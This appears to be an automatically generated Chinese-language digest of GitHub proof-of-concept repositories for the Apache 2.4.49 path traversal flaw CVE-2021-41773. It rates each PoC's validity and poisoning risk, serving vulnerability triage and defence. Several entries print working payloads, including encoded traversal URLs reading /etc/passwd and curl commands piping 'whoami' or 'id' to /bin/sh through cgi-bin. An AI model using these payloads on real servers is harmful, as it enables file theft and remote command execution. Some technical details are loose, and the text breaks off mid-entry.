CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

